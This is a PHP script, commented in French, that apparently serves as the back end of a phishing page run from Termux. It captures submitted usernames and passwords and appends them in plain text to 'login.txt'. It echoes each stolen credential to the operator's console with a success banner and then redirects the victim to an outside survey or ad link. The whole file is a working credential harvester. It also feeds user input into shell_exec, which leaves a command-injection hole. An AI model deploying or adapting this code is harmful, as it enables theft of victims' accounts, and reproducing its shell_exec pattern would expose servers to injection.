<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = htmlspecialchars(trim($_POST["username"]));  // Adresse e-mail ou numéro de téléphone
    $password = htmlspecialchars(trim($_POST["password"]));  // Mot de passe

    // Vérifie si les champs ne sont pas vides
    if (!empty($username) && !empty($password)) {
        // Formate les données pour l'enregistrement
        $data = "Nom d'utilisateur (Email/Téléphone) : " . $username . " | Mot de passe : " . $password . "\n";

        // Tente d'enregistrer les données dans le fichier 'login.txt'
        $file = "login.txt";
        if (file_put_contents($file, $data, FILE_APPEND)) {

            // Affiche dans la console Termux via echo
            $cmd = "echo -e \"\033[1;34m[+] 1 utilisateur s'est connecté\033[0m\"";
            shell_exec($cmd);
            $cmd = "echo -e \"\033[1;33mUsername: $username\033[0m\"";
            shell_exec($cmd);
            $cmd = "echo -e \"\033[1;33mPassword: $password\033[0m\"";
            shell_exec($cmd);
            $cmd = "echo -e \"En attente des autres utilisateurs...\"";
            shell_exec($cmd);

            // Si l'enregistrement réussit, redirige l'utilisateur
            header("Location: https://choofoogoaltee.com/finance-survey/272?var=21548660&s=880981261281141219&ymid=1147523&z=8304443&var_3=45bf0773b18612693f38f9587bf57bde&rdk=rk3");
            exit();
        } else {
            // Message en cas d'erreur d'écriture
            echo "Erreur : Impossible d'enregistrer les données.";
        }
    } else {
        // Message si les champs sont vides
        echo "Erreur : Veuillez remplir tous les champs.";
    }
} else {
    // Message si le formulaire n'a pas été soumis
    echo "Aucune donnée reçue.";
}
?>
